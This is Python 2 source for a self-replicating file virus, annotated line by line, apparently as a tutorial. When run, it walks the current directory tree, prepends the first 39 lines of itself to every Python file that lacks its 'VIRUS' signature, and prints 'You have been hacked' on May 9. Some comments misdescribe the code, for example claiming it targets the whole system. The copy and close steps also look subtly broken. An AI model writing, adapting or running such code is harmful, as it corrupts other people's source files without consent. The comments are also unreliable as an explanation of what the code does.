#!/usr/bin/python

# imports necessary libraries
import os
import datetime

# This line prevents the python file from being added to the files_targeted array
SIGNATURE = "VIRUS"

# This function's main job is to create a target list and make sure any python files containing SIGNATURE are not added to the target list
def locate(path):
    # creates an empty list to store targeted files
    files_targeted = []
    # returns a list containing the names of the entries in the directory given by path and stores it in filelist variable
    filelist = os.listdir(path)
    # for loop to enumerate through filelist 
    for fname in filelist:
        # If path and file name provided... 
        if os.path.isdir(path+"/"+fname):
            # ...add path and file to the files_targeted list
            files_targeted.extend(locate(path+"/"+fname))
        # Else if the file path ends in .py...
        elif fname[-3:] == ".py":
            # Sets infected boolean value to False initially before running a for loop to check for signature...
            infected = False
            # Runs a for loop through the python file to check if there is a signature variable and if so sets infected boolean variable to true and breaks out of the for loop
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            # if infected variable is false then add the python file to the files_targeted list
            if infected == False:
                files_targeted.append(path+"/"+fname)
    # Returns updated files_targeted list
    return files_targeted

# Now we pass in the targeted files from the previous function to be infected...
def infect(files_targeted):
    # Sets virus variable equal to method that returns the pathname to the path passed as a parameter to this function and opens it
    # In Python a .py file is a module, __file__ is the pathname of the file the module was loaded from  
    virus = open(os.path.abspath(__file__))
    # Creates an empty string variable
    virusstring = ""
    # Enumerate specific lines
    for i,line in enumerate(virus):
        # if line 0 is less than or equal to the value of i to line 40... 
        if 0 <= i < 39:
            # Set virusstring to virusstring = virusstring + line
            virusstring += line
    # Close file
    virus.close
    # So at this point we have copied the contents of this virus file and stored it in virusstring variable...
    # For loop through files_targeted...
    for fname in files_targeted:
        # sets f variable equal to opened file
        f = open(fname)
        # sets temp variable equal to a method that returns the whole text from the file 
        temp = f.read()
        # Closes the file
        f.close()
        # Opens the file with write privilege
        f = open(fname,"w")
        # Writes virusstring and temp to the target file
        f.write(virusstring + temp)
        # Closes the file
        f.close()

def detonate():
    # if the current system date is equal to May 9th then prints "You have been hacked"
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print "You have been hacked"

# sets files_targeted equal to function call containing the absolute path of everything on the system 
files_targeted = locate(os.path.abspath(""))
# passes files_targeted  to the infect function and kicks it off
infect(files_targeted)
# executes the detonate function
detonate()
